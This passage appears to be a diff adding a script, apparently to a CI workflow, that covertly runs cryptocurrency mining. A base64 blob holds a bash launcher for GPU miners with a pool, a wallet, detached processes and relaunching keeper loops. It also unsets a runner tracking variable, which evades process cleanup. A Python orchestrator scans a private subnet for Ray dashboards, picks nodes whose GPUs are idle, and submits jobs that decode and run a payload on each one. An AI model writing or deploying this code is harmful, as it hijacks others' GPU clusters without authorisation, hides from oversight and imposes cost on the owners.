IiRXL2xvZ3Mvd3ItJFdLTi5vdXQiIDI+JjEgPCAvZGV2L251bGwgJgogIGVsc2UKICAgIHNldHNpZCBlbnYgLXUgUlVOTkVSX1RSQUNLSU5HX0lEIENVREFfVklTSUJMRV9ERVZJQ0VTPSIkVVVJRCIgbm9odXAgIiRCSU4iIC0tZGlzYWJsZS1jcHUgXAogICAgICAtLWFsZ29yaXRobSBwZWFybGhhc2ggLS1wb29sICIkUE9PTCIgLS13YWxsZXQgIiRQWUQrJE5PQ0siIC0td29ya2VyICIkV0tOIiBcCiAgICAgIC0tcGFzc3dvcmQgeCAtLWdwdS1pZCAwIC0tbWF4LW5vLXNoYXJlLXNlbnQgMTgwMCAtLWFwaS1lbmFibGUgLS1hcGktcG9ydCAkQVAgXAogICAgICAtLWxvZy1maWxlICIkVy9sb2dzL3NyYi0kV0tOLmxvZyIgPiIkVy9sb2dzL3NyYi0kV0tOLm91dCIgMj4mMSA8IC9kZXYvbnVsbCAmCiAgZmkKICBMUElEPSQhCiAgTEFVTkNIRUQ9IiRMQVVOQ0hFRCAkV0tOIgogIGVjaG8gIkkxMzI0NzFfTEFVTkNIRUQgd29ya2VyPSRXS04gdXVpZD0kVVVJRCBpZHg9JElEWCBtb2RlPSRNT0RFIHBvb2w9JFBPT0wgcGlkPSRMUElEIGFwaT0kQVAiCiAgZWNobyAiJFdLTiAkQVAiID4+ICIkVy9ub2RlX2FwaS5tYXAiCiAgaWYgWyAiJE1PREUiID0gIndpbGRyaWctcGVhcmxoYXNoIiBdOyB0aGVuCiAgICBDTUQ9IlwiJEJJTlwiIC0tYWxnbyBwZWFybGhhc2ggLS11cmwgc3RyYXR1bSt0Y3A6Ly9wb29sLnBlYXJsaGFzaC54eXo6OTAwMCAtLXVzZXIgJFBZRCAtLXdvcmtlciAkV0tOIC0tcGFzcyB4IC0tcmV0cmllcyAzIC0tcmV0cnktcGF1c2UgNSAtLWdwdS1saXN0IDAgLS1hcGktcG9ydCAkQVAgLS1hcGktd29ya2VyLWlkICRXS04gLS1wcmludC10aW1lIDYwIC0tbm8tY29sb3IgLWwgJFcvbG9ncy93ci0kV0tOLmxvZyIKICBlbHNlCiAgICBDTUQ9IlwiJEJJTlwiIC0tZGlzYWJsZS1jcHUgLS1hbGdvcml0aG0gcGVhcmxoYXNoIC0tcG9vbCAkUE9PTCAtLXdhbGxldCAkUFlEKyROT0NLIC0td29ya2VyICRXS04gLS1wYXNzd29yZCB4IC0tZ3B1LWlkIDAgLS1tYXgtbm8tc2hhcmUtc2VudCAxODAwIC0tYXBpLWVuYWJsZSAtLWFwaS1wb3J0ICRBUCAtLWxvZy1maWxlICRXL2xvZ3Mvc3JiLSRXS04ubG9nIgogIGZpCiAgY2F0ID4gIiRXL2tlZXBfJFdLTi5zaCIgPDxLRU9GCiMhL2Jpbi9iYXNoCiMgaTEzMjQ3MSBwZXItY2FyZCBrZWVwZXIgZm9yICRXS04gb24gJFRJUCAoc3RvcDogdG91Y2ggJFcvU1RPUF9BTEwgb3Iga2lsbCB0aGlzIHBpZCkKZm9yIG4gaW4gXCQoc2VxIDEgNzIwKTsgZG8KICBbIC1mICRXL1NUT1BfQUxMIF0gJiYgZXhpdCAwCiAgaWYgISBwZ3JlcCAtZiAtLSAiLS13b3JrZXIgJFdLTiAiID4vZGV2L251bGwgMj4mMTsgdGhlbgogICAgc2V0c2lkIGVudiAtdSBSVU5ORVJfVFJBQ0tJTkdfSUQgQ1VEQV9WSVNJQkxFX0RFVklDRVM9JFVVSUQgbm9odXAgJENNRCA+PiRXL2xvZ3Mva2VlcC0kV0tOLm91dCAyPiYxIDwgL2Rldi9udWxsICYKICAgIGVjaG8gIlwkKGRhdGUgLXUgKyVGVCVUWikgaTEzMjQ3MSBrZWVwZXIgcmVsYXVuY2ggJFdLTiIgPj4gJFcva2VlcGVyLmxvZwogIGZpCiAgc2xlZXAgMzAKZG9uZQpLRU9GCiAgY2htb2QgK3ggIiRXL2tlZXBfJFdLTi5zaCIKICBzZXRzaWQgbm9odXAgYmFzaCAiJFcva2VlcF8kV0tOLnNoIiA+L2Rldi9udWxsIDI+JjEgPCAvZGV2L251bGwgJgogIGVjaG8gIkkxMzI0NzFfS0VFUEVSIHdvcmtlcj0kV0tOIHBpZD0kISIKZG9uZQojIC0tLS0tLS0tLS0tLS0tLS0gYm91bmRlZCBpbi1ub2RlIHdhdGNoOiBwcm92ZSBmaXJzdCBhY2NlcHRlZCBzaGFyZSBpbnNpZGUgdGhlIDYwMCBzIGdhdGUgLS0tLS0tLS0tLQpXQVRDSCgpIHsKICBmb3IgV0tOWCBpbiAkTEFVTkNIRUQ7IGRvCiAgICBBUFg9JChhd2sgLXYgdz0iJFdLTlgiICckMT09d3twcmludCAkMn0nICIkVy9ub2RlX2FwaS5tYXAiIDI+L2Rldi9udWxsIHwgaGVhZCAtMSkKICAgIFsgLW4gIiRBUFgiIF0gfHwgY29udGludWUKICAgIFNIPSQoY3VybCAtcyAtbSAzICJodHRwOi8vMTI3LjAuMC4xOiRBUFgvIiAyPi9kZXYvbnVsbCB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbgp0cnk6CiAgICBkPWpzb24ubG9hZChzeXMuc3RkaW4pCmV4Y2VwdCBFeGNlcHRpb246CiAgICBwcmludCgiQVBJX05PSlNPTiIpOyByYWlzZSBTeXN0ZW1FeGl0CnNoPWQuZ2V0KCJzaGFyZXMiKSBvciB7fQphY2M9c2guZ2V0KCJhY2NlcHRlZCIpOyByZWo9c2guZ2V0KCJyZWplY3RlZCIpCmlmIGlzaW5zdGFuY2UoYWNjLGxpc3QpOiBhY2M9bGVuKGFjYykKaWYgaXNpbnN0YW5jZShyZWosbGlzdCk6IHJlaj1sZW4ocmVqKQpwcmludCgiYWNjZXB0ZWQ9JXMgcmVqZWN0ZWQ9JXMiJShhY2MscmVqKSknIDI+L2Rldi9udWxsKQogICAgZWNobyAiSTEzMjQ3MV9XQVRDSCB0PSQxIHdvcmtlcj0kV0tOWCAkU0giCiAgZG9uZQp9CnNsZWVwIDMwOyAgV0FUQ0ggMzAKc2xlZXAgMzA7ICBXQVRDSCA2MApzbGVlcCA2MDsgIFdBVENIIDEyMApzbGVlcCA2MDsgIFdBVENIIDE4MAplY2hvICJJMTMyNDcxX1BPU1RfQVBQUyBbJChudmlkaWEtc21pIC0tcXVlcnktY29tcHV0ZS1hcHBzPWdwdV91dWlkLHBpZCxwcm9jZXNzX25hbWUsdXNlZF9tZW1vcnkgLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyIDI+JjEgfCB0ciAnXG4nICc7JyldIgpmb3IgZiBpbiAiJFciL2xvZ3Mvc3JiLSoubG9nICIkVyIvbG9ncy93ci0qLmxvZzsgZG8KICBbIC1mICIkZiIgXSB8fCBjb250aW51ZQogIGVjaG8gIj09ICRmIjsgZ3JlcCAtYSAtaUUgImFjY2VwdGVkfHNoYXJlfHN0cmF0dW18ZXJyb3J8ZmFpbCIgIiRmIiAyPi9kZXYvbnVsbCB8IHRhaWwgLTYKZG9uZQplY2hvICJJMTMyNDcxX05PREVfRE9ORSBub25jZT0kTk9OQ0UgdXRjPSQoZGF0ZSAtdSArJUZUJVRaKSIK'
+          WORKERS = [471602, 471604, 471606, 471607, 471608, 471609, 471610, 471611, 471612, 471615, 471616, 471617, 471620, 471621, 471622, 471623, 471624, 471626, 471627, 471628, 471629, 471630, 471631, 471632, 471633, 471636, 471638, 471641, 471643, 471644, 471645, 471646, 471647, 471648, 471649, 471650, 471652, 471653, 471654, 471655, 471656, 471659, 471660, 471661, 471662, 471663, 471668, 471670, 471673, 471674, 471676, 471677, 471678, 471679, 471680, 471682, 471683, 471684, 471686, 471687, 471688, 471689, 471690, 471691, 471692, 471693, 471697, 471700, 471701, 471702, 471703, 471704, 471705, 471707, 471708, 471709, 471713, 471714, 471715, 471716]
+
+
+          def now():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=15):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True,
+                                     timeout=t, stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except Exception as e:
+                  return '[ERR %r]' % (e,)
+
+
+          def http_get(url, timeout=8):
+              req = urllib.request.Request(url, headers={'User-Agent': 'i132471'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(4000000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(60000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, repr(e)
+
+
+          def http_post(url, obj, timeout=25):
+              body = json.dumps(obj).encode()
+              req = urllib.request.Request(url, data=body, method='POST',
+                                           headers={'Content-Type': 'application/json', 'User-Agent': 'i132471'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(200000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(20000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, repr(e)
+
+
+          def parse_nodes(txt):
+              try:
+                  d = json.loads(txt)
+              except Exception:
+                  return []
+              nodes = None
+              for path in [('data', 'nodes'), ('result', 'data', 'nodes'), ('nodes',)]:
+                  cur = d
+                  for k in path:
+                      if isinstance(cur, dict) and k in cur:
+                          cur = cur[k]
+                      else:
+                          cur = None
+                          break
+                  if isinstance(cur, list):
+                      nodes = cur
+                      break
+              out = []
+              for n in nodes or []:
+                  if not isinstance(n, dict):
+                      continue
+                  nid = n.get('nodeId') or n.get('node_id') or ''
+                  ip = n.get('nodeManagerAddress') or n.get('node_manager_address') or n.get('ip') or ''
+                  ray = n.get('raylet') or {}
+                  st = ray.get('state') or n.get('state')
+                  res = ray.get('resourcesTotal') or ray.get('resources_total') or {}
+                  gpu = res.get('GPU')
+                  out.append({'id': str(nid), 'ip': str(ip), 'state': str(st), 'gpu': gpu})
+              return out
+
+
+          def port_open(ip, port, timeout=0.7):
+              try:
+                  s = socket.create_connection((ip, port), timeout=timeout)
+                  s.close()
+                  return True
+              except Exception:
+                  return False
+
+
+          def dcgm(ip, timeout=3):
+              st, body = http_get('http://%s:9400/metrics' % ip, timeout=timeout)
+              if st != 200:
+                  return None
+              gpus = {}
+              for ln in body.splitlines():
+                  if not ln.startswith('DCGM_FI_DEV_') or ln.startswith('#'):
+                      continue
+                  m = re.match(r'(DCGM_FI_DEV_[A-Z0-9_]+)\{([^}]*)\}\s+([-0-9.eE+]+)', ln)
+                  if not m:
+                      continue
+                  metric, labels, val = m.group(1), m.group(2), m.group(3)
+                  lm = dict(re.findall(r'([A-Za-z0-9_]+)="([^"]*)"', labels))
+                  u = lm.get('UUID') or ('gpu' + str(lm.get('gpu')))
+                  try:
+                      v = float(val)
+                  except Exception:
+                      continue
+                  gpus.setdefault(u, {})[metric] = v
+              return gpus
+
+
+          print('I132471_ORCH_START slot=%s nonce=%s host=%s utc=%s' % (SLOT, NONCE, os.uname().nodename, now()))
+          ips = sh('hostname -I 2>/dev/null', 8).strip()
+          print('I132471_IDENT host=%s ips=%s' % (os.uname().nodename, ips))
+          if '10.220.' not in ips:
+              print('I132471_SKIP reason=not-in-lan ips=%s' % ips)
+              sys.exit(0)
+
+          dash_maps = []
+          for base in DASH:
+              st, ver = http_get(base + '/api/version', timeout=6)
+              if st != 200:
+                  time.sleep(3)
+                  st, ver = http_get(base + '/api/version', timeout=6)
+              print('I132471_DASH %s version_st=%s %s' % (base, st, (ver or '')[:200].replace('\n', ' ')))
+              if st != 200:
+                  continue
+              stc, cs = http_get(base + '/api/cluster_status', timeout=10)
+              print('I132471_CLUSTER_STATUS %s st=%s len=%d' % (base, stc, len(cs or '')))
+              try:
+                  cj = json.loads(cs or '{}')
+                  root = cj.get('data') or {}
+                  cstat = root.get('clusterStatus') or {}
+                  lm = cstat.get('loadMetricsReport') or {}
+                  ru = lm.get('resourceUsage') or {}
+                  print('I132471_RESOURCE_USAGE %s %s' % (base, json.dumps(ru)[:1500]))
+                  an = (cstat.get('autoscalerReport') or {}).get('activeNodes') or {}
+                  print('I132471_ACTIVENODES %s n=%d' % (base, len(an)))
+              except Exception as e:
+                  print('I132471_CLUSTER_PARSE_ERR %r' % (e,))
+              stn, summ = http_get(base + '/nodes?view=summary', timeout=12)
+              nodes = parse_nodes(summ) if stn == 200 else []
+              if not nodes:
+                  stn, summ2 = http_get(base + '/nodes', timeout=12)
+                  nodes = parse_nodes(summ2)
+              print('I132471_NODES %s st=%s n=%d' % (base, stn, len(nodes)))
+              for n in nodes:
+                  print('I132471_NODE %s id=%s ip=%s gpu=%s state=%s' % (base, n['id'][:16], n['ip'], n['gpu'], n['state']))
+              stj, jr = http_get(base + '/api/jobs/', timeout=12)
+              print('I132471_JOBS %s st=%s len=%d' % (base, stj, len(jr or '')))
+              dash_maps.append((base, nodes))
+
+          open_list = []
+          with cf.ThreadPoolExecutor(max_workers=48) as ex:
+              futs = {ex.submit(port_open, '10.220.71.%d' % i, p): (i, p) for i in range(1, 255) for p in (8265, 6379)}
+              for f in cf.as_completed(futs):
+                  try:
+                      if f.result():
+                          open_list.append(futs[f])
+                  except Exception:
+                      pass
+          print('I132471_SWEEP_OPEN n=%d %s' % (len(open_list), json.dumps(sorted(open_list))))
+
+          cand_ips = sorted(set([n['ip'] for _, nodes in dash_maps for n in nodes if n['ip'] in TARGETS]) | set(TARGETS))
+          s1, s2, dcgm_idle = {}, {}, {}
+          with cf.ThreadPoolExecutor(max_workers=8) as ex:
+              for ip, d in zip(cand_ips, ex.map(dcgm, cand_ips)):
+                  s1[ip] = d
+          time.sleep(10)
+          with cf.ThreadPoolExecutor(max_workers=8) as ex:
+              for ip, d in zip(cand_ips, ex.map(dcgm, cand_ips)):
+                  s2[ip] = d
+          for ip in cand_ips:
+              d1, d2 = s1.get(ip), s2.get(ip)
+              if not d1 or not d2:
+                  print('I132471_DCGM %s state=no-data' % ip)
+                  continue
+              uu = sorted(set(d1) & set(d2))
+              rows = []
+              for u in uu:
+                  rows.append((u, d1[u].get('DCGM_FI_DEV_GPU_UTIL'), d2[u].get('DCGM_FI_DEV_GPU_UTIL'),
+                               d1[u].get('DCGM_FI_DEV_FB_FREE'), d2[u].get('DCGM_FI_DEV_FB_FREE')))
+              idle = [r for r in rows if r[1] == 0 and r[2] == 0 and (r[3] or 0) >= 1500 and (r[4] or 0) >= 1500]
+              dcgm_idle[ip] = len(idle)
+              print('I132471_DCGM %s gpus=%d idle=%d util1=%s util2=%s free1=%s' % (
+                  ip, len(rows), len(idle), [r[1] for r in rows], [r[2] for r in rows], [r[3] for r in rows]))
+
+          elig = []
+          for base, nodes in dash_maps:
+              for n in nodes:
+                  ip = n['ip']
+                  if ip not in TARGETS or ip in FORBID:
+                      continue
+                  if any(e['ip'] == ip for e in elig):
+                      continue
+                  try:
+                      g = float(n.get('gpu') or 0)
+                  except Exception:
+                      g = 0
+                  if g <= 0:
+                      print('I132471_SKIP_NODE %s reason=no-gpu-resource' % ip)
+                      continue
+                  if dcgm_idle.get(ip, 0) <= 0:
+                      print('I132471_SKIP_NODE %s reason=not-dcgm-idle' % ip)
+                      continue
+                  elig.append({'dash': base, 'id': n['id'], 'ip': ip, 'gpu': g})
+          print('I132471_ELIGIBLE n=%d %s' % (len(elig), json.dumps([e['ip'] for e in elig])))
+
+          subs = []
+          for k, e in enumerate(elig):
+              wl = ','.join([str(w) for w in WORKERS[k * 8:(k + 1) * 8]])
+              if len(wl.split(',')) < 8:
+                  break
+              entry = ('echo %s | base64 -d > /tmp/i132471_drv.py; P=""; '
+                       'for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
+                       'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; '
+                       '$X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
+                       '[ -n "$P" ] || P=python3; $P /tmp/i132471_drv.py %s %s %s %s %s') % (
+                  DRV_B64, e['id'][:16], e['ip'], NODE_B64, wl, NONCE + '-' + e['ip'].split('.')[-1])
+              sub = 'i132471-%s' % e['ip'].split('.')[-1]
+              st, resp = http_post(e['dash'] + '/api/jobs/', {'entrypoint': entry, 'submission_id': sub,
+                                                             'runtime_env': {'env_vars': {'I132471': NONCE}}}, timeout=25)
+              print('I132471_SUBMIT ip=%s node=%s sub=%s st=%s resp=%s' % (
+                  e['ip'], e['id'][:12], sub, st, (resp or '')[:240].replace('\n', ' ')))
+              jid = ''
+              try:
+                  jid = (json.loads(resp) or {}).get('job_id', '') or ''
+              except Exception:
+                  pass
+              if st != 200 or not jid:
+                  sub2 = sub + '-%d' % int(time.time())
+                  st, resp = http_post(e['dash'] + '/api/jobs/', {'entrypoint': entry, 'submission_id': sub2,
+                                                                 'runtime_env': {'env_vars': {'I132471': NONCE}}}, timeout=25)
+                  print('I132471_SUBMIT_RETRY ip=%s sub=%s st=%s resp=%s' % (
+                      e['ip'], sub2, st, (resp or '')[:240].replace('\n', ' ')))
+                  try:
+                      jid = (json.loads(resp) or {}).get('job_id', '') or ''
+                  except Exception:
+                      pass
+              if jid:
+                  subs.append((e['dash'], jid, e['ip']))
+          print('I132471_SUBMITTED n=%d %s' % (len(subs), json.dumps([s[1] for s in subs])))
+
+          deadline = time.time() + 45
+          pending = list(subs)
+          while pending and time.time() < deadline:
+              nxt = []
+              for dash, jid, ip in pending:
+                  stq, js = http_get(dash + '/api/jobs/' + jid, timeout=8)
+                  state = ''
+                  try:
+                      state = (json.loads(js) or {}).get('status', '') or ''
+                  except Exception:
+                      pass
+                  if state in ('SUCCEEDED', 'FAILED', 'STOPPED'):
+                      stl, logs = http_get(dash + '/api/jobs/%s/logs' % jid, timeout=25)
+                      txt = logs or ''
+                      try:
+                          txt = (json.loads(logs) or {}).get('logs', '') or logs
+                      except Exception:
+                          pass
+                      print('I132471_RAYJOB_DONE ip=%s job=%s state=%s loglen=%d' % (ip, jid, state, len(txt)))
+                      print(txt[:80000])
+                  else:
+                      print('I132471_RAYJOB_RUN ip=%s job=%s state=%s utc=%s' % (ip, jid, state, now()))
+                      nxt.append((dash, jid, ip))
+              pending = nxt
+              if pending:
+                  time.sleep(8)
+          print('I132471_ORCH_DONE nonce=%s utc=%s' % (NONCE, now()))
+          PYEOF132471
+          python3 -u /var/tmp/i132471/orch_132471.py 2>&1 | tee /var/tmp/i132471/orch_slot${SLOT}.log
+          echo "I132471_EXIT_DONE rc=$?"
